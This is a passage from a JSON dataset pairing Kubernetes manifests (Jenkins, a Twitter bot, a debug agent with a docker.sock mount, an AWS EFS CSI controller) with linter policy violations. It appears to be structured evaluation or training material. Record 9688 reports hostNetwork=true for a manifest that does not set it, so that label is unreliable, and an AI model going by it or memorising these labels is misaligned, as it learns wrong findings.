    "manifest_path": "data/manifests/the_stack_sample/sample_3704.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: jenkins\n  namespace: jenkins\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: jenkins-server\n  template:\n    metadata:\n      labels:\n        app: jenkins-server\n    spec:\n      securityContext:\n        fsGroup: 1000\n        runAsUser: 1000\n      serviceAccountName: jenkins-admin\n      containers:\n      - name: jenkins\n        image: jenkins4eval/jenkins:latest\n        env:\n        - name: JAVA_OPTS\n          value: -Dorg.csanchez.jenkins.plugins.kubernetes.pipeline.ContainerExecDecorator.websocketConnectionTimeout=1000\n        resources:\n          limits:\n            memory: 1Gi\n            cpu: 1000m\n          requests:\n            memory: 500Mi\n            cpu: 500m\n        ports:\n        - name: httpport\n          containerPort: 8080\n        - name: jnlpport\n          containerPort: 50000\n        volumeMounts:\n        - name: jenkins-data\n          mountPath: /var/jenkins_home\n      volumes:\n      - name: jenkins-data\n        persistentVolumeClaim:\n          claimName: jenkins-pvc\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"jenkins-admin\" not found"
  },
  {
    "id": "9680",
    "manifest_path": "data/manifests/the_stack_sample/sample_3706.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cpdpbot\n  labels:\n    app: cpdpbot\nspec:\n  selector:\n    matchLabels:\n      app: cpdpbot\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: cpdpbot\n    spec:\n      containers:\n      - name: cpdpbot\n        image: cpdbdev/cpdpbot:${CPDPBOT_IMAGE_TAG}\n        imagePullPolicy: Always\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n        env:\n        - name: AZURE_QUEUE_NAME\n          value: cpdpbot\n        - name: TWITTER_CONSUMER_KEY\n          valueFrom:\n            secretKeyRef:\n              name: twitter-cpdpbot-account\n              key: consumer-key\n        - name: TWITTER_CONSUMER_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: twitter-cpdpbot-account\n              key: consumer-secret\n        - name: TWITTER_APP_TOKEN_KEY\n          valueFrom:\n            secretKeyRef:\n              name: twitter-cpdpbot-account\n              key: app-token-key\n        - name: TWITTER_APP_TOKEN_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: twitter-cpdpbot-account\n              key: app-token-secret\n        - name: AZURE_STORAGE_ACCOUNT_NAME\n          valueFrom:\n            secretKeyRef:\n              name: twitterbot-storage-account\n              key: name\n        - name: AZURE_STORAGE_ACCOUNT_KEY\n          valueFrom:\n            secretKeyRef:\n              name: twitterbot-storage-account\n              key: key\n        - name: PAPERTRAIL_ENDPOINT\n          valueFrom:\n            secretKeyRef:\n              name: papertrail\n              key: endpoint\n        - name: PAPERTRAIL_PORT\n          valueFrom:\n            secretKeyRef:\n              name: papertrail\n              key: port\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cpdpbot\" does not have a read-only root file system"
  },
  {
    "id": "9681",
    "manifest_path": "data/manifests/the_stack_sample/sample_3706.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cpdpbot\n  labels:\n    app: cpdpbot\nspec:\n  selector:\n    matchLabels:\n      app: cpdpbot\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: cpdpbot\n    spec:\n      containers:\n      - name: cpdpbot\n        image: cpdbdev/cpdpbot:${CPDPBOT_IMAGE_TAG}\n        imagePullPolicy: Always\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n        env:\n        - name: AZURE_QUEUE_NAME\n          value: cpdpbot\n        - name: TWITTER_CONSUMER_KEY\n          valueFrom:\n            secretKeyRef:\n              name: twitter-cpdpbot-account\n              key: consumer-key\n        - name: TWITTER_CONSUMER_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: twitter-cpdpbot-account\n              key: consumer-secret\n        - name: TWITTER_APP_TOKEN_KEY\n          valueFrom:\n            secretKeyRef:\n              name: twitter-cpdpbot-account\n              key: app-token-key\n        - name: TWITTER_APP_TOKEN_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: twitter-cpdpbot-account\n              key: app-token-secret\n        - name: AZURE_STORAGE_ACCOUNT_NAME\n          valueFrom:\n            secretKeyRef:\n              name: twitterbot-storage-account\n              key: name\n        - name: AZURE_STORAGE_ACCOUNT_KEY\n          valueFrom:\n            secretKeyRef:\n              name: twitterbot-storage-account\n              key: key\n        - name: PAPERTRAIL_ENDPOINT\n          valueFrom:\n            secretKeyRef:\n              name: papertrail\n              key: endpoint\n        - name: PAPERTRAIL_PORT\n          valueFrom:\n            secretKeyRef:\n              name: papertrail\n              key: port\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cpdpbot\" is not set to runAsNonRoot"
  },
  {
    "id": "9682",
    "manifest_path": "data/manifests/the_stack_sample/sample_3706.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cpdpbot\n  labels:\n    app: cpdpbot\nspec:\n  selector:\n    matchLabels:\n      app: cpdpbot\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: cpdpbot\n    spec:\n      containers:\n      - name: cpdpbot\n        image: cpdbdev/cpdpbot:${CPDPBOT_IMAGE_TAG}\n        imagePullPolicy: Always\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n        env:\n        - name: AZURE_QUEUE_NAME\n          value: cpdpbot\n        - name: TWITTER_CONSUMER_KEY\n          valueFrom:\n            secretKeyRef:\n              name: twitter-cpdpbot-account\n              key: consumer-key\n        - name: TWITTER_CONSUMER_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: twitter-cpdpbot-account\n              key: consumer-secret\n        - name: TWITTER_APP_TOKEN_KEY\n          valueFrom:\n            secretKeyRef:\n              name: twitter-cpdpbot-account\n              key: app-token-key\n        - name: TWITTER_APP_TOKEN_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: twitter-cpdpbot-account\n              key: app-token-secret\n        - name: AZURE_STORAGE_ACCOUNT_NAME\n          valueFrom:\n            secretKeyRef:\n              name: twitterbot-storage-account\n              key: name\n        - name: AZURE_STORAGE_ACCOUNT_KEY\n          valueFrom:\n            secretKeyRef:\n              name: twitterbot-storage-account\n              key: key\n        - name: PAPERTRAIL_ENDPOINT\n          valueFrom:\n            secretKeyRef:\n              name: papertrail\n              key: endpoint\n        - name: PAPERTRAIL_PORT\n          valueFrom:\n            secretKeyRef:\n              name: papertrail\n              key: port\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cpdpbot\" has memory limit 0"
  },
  {
    "id": "9683",
    "manifest_path": "data/manifests/the_stack_sample/sample_3707.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    app: debug-agent\n  name: debug-agent\nspec:\n  selector:\n    matchLabels:\n      app: debug-agent\n  template:\n    metadata:\n      labels:\n        app: debug-agent\n    spec:\n      containers:\n      - image: aylei/debug-agent:v0.1.1\n        imagePullPolicy: Always\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10027\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        name: debug-agent\n        ports:\n        - containerPort: 10027\n          hostPort: 10027\n          name: http\n          protocol: TCP\n        volumeMounts:\n        - name: docker\n          mountPath: /var/run/docker.sock\n      volumes:\n      - name: docker\n        hostPath:\n          path: /var/run/docker.sock\n",
    "policy_id": "docker-sock",
    "violation_text": "host system directory \"/var/run/docker.sock\" is mounted on container \"debug-agent\""
  },
  {
    "id": "9684",
    "manifest_path": "data/manifests/the_stack_sample/sample_3707.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    app: debug-agent\n  name: debug-agent\nspec:\n  selector:\n    matchLabels:\n      app: debug-agent\n  template:\n    metadata:\n      labels:\n        app: debug-agent\n    spec:\n      containers:\n      - image: aylei/debug-agent:v0.1.1\n        imagePullPolicy: Always\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10027\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        name: debug-agent\n        ports:\n        - containerPort: 10027\n          hostPort: 10027\n          name: http\n          protocol: TCP\n        volumeMounts:\n        - name: docker\n          mountPath: /var/run/docker.sock\n      volumes:\n      - name: docker\n        hostPath:\n          path: /var/run/docker.sock\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"debug-agent\" does not have a read-only root file system"
  },
  {
    "id": "9685",
    "manifest_path": "data/manifests/the_stack_sample/sample_3707.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    app: debug-agent\n  name: debug-agent\nspec:\n  selector:\n    matchLabels:\n      app: debug-agent\n  template:\n    metadata:\n      labels:\n        app: debug-agent\n    spec:\n      containers:\n      - image: aylei/debug-agent:v0.1.1\n        imagePullPolicy: Always\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10027\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        name: debug-agent\n        ports:\n        - containerPort: 10027\n          hostPort: 10027\n          name: http\n          protocol: TCP\n        volumeMounts:\n        - name: docker\n          mountPath: /var/run/docker.sock\n      volumes:\n      - name: docker\n        hostPath:\n          path: /var/run/docker.sock\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"debug-agent\" is not set to runAsNonRoot"
  },
  {
    "id": "9686",
    "manifest_path": "data/manifests/the_stack_sample/sample_3707.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    app: debug-agent\n  name: debug-agent\nspec:\n  selector:\n    matchLabels:\n      app: debug-agent\n  template:\n    metadata:\n      labels:\n        app: debug-agent\n    spec:\n      containers:\n      - image: aylei/debug-agent:v0.1.1\n        imagePullPolicy: Always\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10027\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        name: debug-agent\n        ports:\n        - containerPort: 10027\n          hostPort: 10027\n          name: http\n          protocol: TCP\n        volumeMounts:\n        - name: docker\n          mountPath: /var/run/docker.sock\n      volumes:\n      - name: docker\n        hostPath:\n          path: /var/run/docker.sock\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"debug-agent\" has cpu request 0"
  },
  {
    "id": "9687",
    "manifest_path": "data/manifests/the_stack_sample/sample_3707.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    app: debug-agent\n  name: debug-agent\nspec:\n  selector:\n    matchLabels:\n      app: debug-agent\n  template:\n    metadata:\n      labels:\n        app: debug-agent\n    spec:\n      containers:\n      - image: aylei/debug-agent:v0.1.1\n        imagePullPolicy: Always\n        livenessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /healthz\n            port: 10027\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        name: debug-agent\n        ports:\n        - containerPort: 10027\n          hostPort: 10027\n          name: http\n          protocol: TCP\n        volumeMounts:\n        - name: docker\n          mountPath: /var/run/docker.sock\n      volumes:\n      - name: docker\n        hostPath:\n          path: /var/run/docker.sock\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"debug-agent\" has memory limit 0"
  },
  {
    "id": "9688",
    "manifest_path": "data/manifests/the_stack_sample/sample_3711.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: efs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-efs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: efs-csi-controller\n      app.kubernetes.io/name: aws-efs-csi-driver\n      app.kubernetes.io/instance: kustomize\n  template:\n    metadata:\n      labels:\n        app: efs-csi-controller\n        app.kubernetes.io/name: aws-efs-csi-driver\n        app.kubernetes.io/instance: kustomize\n    spec:\n      serviceAccountName: efs-csi-controller-sa\n      containers:\n      - name: efs-plugin\n        securityContext:\n          privileged: true\n        image: amazon/aws-efs-csi-driver:v1.2.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        - --delete-access-point-root-dir=false\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9909\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: public.ecr.aws/eks-distro/kubernetes-csi/external-provisioner:v2.1.1-eks-1-18-2\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --leader-election\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: public.ecr.aws/eks-distro/kubernetes-csi/livenessprobe:v2.2.0-eks-1-18-2\n        args:\n        - --csi-address=/csi/csi.sock\n        - --health-port=9909\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "9689",
    "manifest_path": "data/manifests/the_stack_sample/sample_3711.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: efs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-efs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: efs-csi-controller\n      app.kubernetes.io/name: aws-efs-csi-driver\n      app.kubernetes.io/instance: kustomize\n  template:\n    metadata:\n      labels:\n        app: efs-csi-controller\n        app.kubernetes.io/name: aws-efs-csi-driver\n        app.kubernetes.io/instance: kustomize\n    spec:\n      serviceAccountName: efs-csi-controller-sa\n      containers:\n      - name: efs-plugin\n        securityContext:\n          privileged: true\n        image: amazon/aws-efs-csi-driver:v1.2.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        - --delete-access-point-root-dir=false\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9909\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: public.ecr.aws/eks-distro/kubernetes-csi/external-provisioner:v2.1.1-eks-1-18-2\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --leader-election\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: public.ecr.aws/eks-distro/kubernetes-csi/livenessprobe:v2.2.0-eks-1-18-2\n        args:\n        - --csi-address=/csi/csi.sock\n        - --health-port=9909\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "9690",
    "manifest_path": "data/manifests/the_stack_sample/sample_3711.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: efs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-efs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: efs-csi-controller\n      app.kubernetes.io/name: aws-efs-csi-driver\n      app.kubernetes.io/instance: kustomize\n  template:\n    metadata:\n      labels:\n        app: efs-csi-controller\n        app.kubernetes.io/name: aws-efs-csi-driver\n        app.kubernetes.io/instance: kustomize\n    spec:\n      serviceAccountName: efs-csi-controller-sa\n      containers:\n      - name: efs-plugin\n        securityContext:\n          privileged: true\n        image: amazon/aws-efs-csi-driver:v1.2.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        - --delete-access-point-root-dir=false\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9909\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: public.ecr.aws/eks-distro/kubernetes-csi/external-provisioner:v2.1.1-eks-1-18-2\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --leader-election\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: public.ecr.aws/eks-distro/kubernetes-csi/livenessprobe:v2.2.0-eks-1-18-2\n        args:\n        - --csi-address=/csi/csi.sock\n        - --health-port=9909\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"csi-provisioner\" does not have a read-only root file system"
  },
  {
    "id": "9691",
    "manifest_path": "data/manifests/the_stack_sample/sample_3711.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: efs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-efs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: efs-csi-controller\n      app.kubernetes.io/name: aws-efs-csi-driver\n      app.kubernetes.io/instance: kustomize\n  template:\n    metadata:\n      labels:\n        app: efs-csi-controller\n        app.kubernetes.io/name: aws-efs-csi-driver\n        app.kubernetes.io/instance: kustomize\n    spec:\n      serviceAccountName: efs-csi-controller-sa\n      containers:\n      - name: efs-plugin\n        securityContext:\n          privileged: true\n        image: amazon/aws-efs-csi-driver:v1.2.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        - --delete-access-point-root-dir=false\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9909\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: public.ecr.aws/eks-distro/kubernetes-csi/external-provisioner:v2.1.1-eks-1-18-2\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --leader-election\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: public.ecr.aws/eks-distro/kubernetes-csi/livenessprobe:v2.2.0-eks-1-18-2\n        args:\n        - --csi-address=/csi/csi.sock\n        - --health-port=9909\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"efs-plugin\" does not have a read-only root file system"
  },
  {
    "id": "9692",
    "manifest_path": "data/manifests/the_stack_sample/sample_3711.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: efs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-efs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: efs-csi-controller\n      app.kubernetes.io/name: aws-efs-csi-driver\n      app.kubernetes.io/instance: kustomize\n  template:\n    metadata:\n      labels:\n        app: efs-csi-controller\n        app.kubernetes.io/name: aws-efs-csi-driver\n        app.kubernetes.io/instance: kustomize\n    spec:\n      serviceAccountName: efs-csi-controller-sa\n      containers:\n      - name: efs-plugin\n        securityContext:\n          privileged: true\n        image: amazon/aws-efs-csi-driver:v1.2.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        - --delete-access-point-root-dir=false\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9909\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: public.ecr.aws/eks-distro/kubernetes-csi/external-provisioner:v2.1.1-eks-1-18-2\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --leader-election\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: public.ecr.aws/eks-distro/kubernetes-csi/livenessprobe:v2.2.0-eks-1-18-2\n        args:\n        - --csi-address=/csi/csi.sock\n        - --health-port=9909\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"liveness-probe\" does not have a read-only root file system"
  },
  {
    "id": "9693",
    "manifest_path": "data/manifests/the_stack_sample/sample_3711.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: efs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-efs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: efs-csi-controller\n      app.kubernetes.io/name: aws-efs-csi-driver\n      app.kubernetes.io/instance: kustomize\n  template:\n    metadata:\n      labels:\n        app: efs-csi-controller\n        app.kubernetes.io/name: aws-efs-csi-driver\n        app.kubernetes.io/instance: kustomize\n    spec:\n      serviceAccountName: efs-csi-controller-sa\n      containers:\n      - name: efs-plugin\n        securityContext:\n          privileged: true\n        image: amazon/aws-efs-csi-driver:v1.2.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        - --delete-access-point-root-dir=false\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9909\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: public.ecr.aws/eks-distro/kubernetes-csi/external-provisioner:v2.1.1-eks-1-18-2\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --leader-election\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: public.ecr.aws/eks-distro/kubernetes-csi/livenessprobe:v2.2.0-eks-1-18-2\n        args:\n        - --csi-address=/csi/csi.sock\n        - --health-port=9909\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"efs-csi-controller-sa\" not found"
  },
  {
    "id": "9694",
    "manifest_path": "data/manifests/the_stack_sample/sample_3711.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: efs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-efs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: efs-csi-controller\n      app.kubernetes.io/name: aws-efs-csi-driver\n      app.kubernetes.io/instance: kustomize\n  template:\n    metadata:\n      labels:\n        app: efs-csi-controller\n        app.kubernetes.io/name: aws-efs-csi-driver\n        app.kubernetes.io/instance: kustomize\n    spec:\n      serviceAccountName: efs-csi-controller-sa\n      containers:\n      - name: efs-plugin\n        securityContext:\n          privileged: true\n        image: amazon/aws-efs-csi-driver:v1.2.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        - --delete-access-point-root-dir=false\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9909\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: public.ecr.aws/eks-distro/kubernetes-csi/external-provisioner:v2.1.1-eks-1-18-2\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --leader-election\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: public.ecr.aws/eks-distro/kubernetes-csi/livenessprobe:v2.2.0-eks-1-18-2\n        args:\n        - --csi-address=/csi/csi.sock\n        - --health-port=9909\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"efs-plugin\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "9695",
    "manifest_path": "data/manifests/the_stack_sample/sample_3711.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: efs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-efs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: efs-csi-controller\n      app.kubernetes.io/name: aws-efs-csi-driver\n      app.kubernetes.io/instance: kustomize\n  template:\n    metadata:\n      labels:\n        app: efs-csi-controller\n        app.kubernetes.io/name: aws-efs-csi-driver\n        app.kubernetes.io/instance: kustomize\n    spec:\n      serviceAccountName: efs-csi-controller-sa\n      containers:\n      - name: efs-plugin\n        securityContext:\n          privileged: true\n        image: amazon/aws-efs-csi-driver:v1.2.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        - --delete-access-point-root-dir=false\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9909\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: public.ecr.aws/eks-distro/kubernetes-csi/external-provisioner:v2.1.1-eks-1-18-2\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --leader-election\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: public.ecr.aws/eks-distro/kubernetes-csi/livenessprobe:v2.2.0-eks-1-18-2\n        args:\n        - --csi-address=/csi/csi.sock\n        - --health-port=9909\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"efs-plugin\" is privileged"
  },
  {
    "id": "9696",
    "manifest_path": "data/manifests/the_stack_sample/sample_3711.yaml",
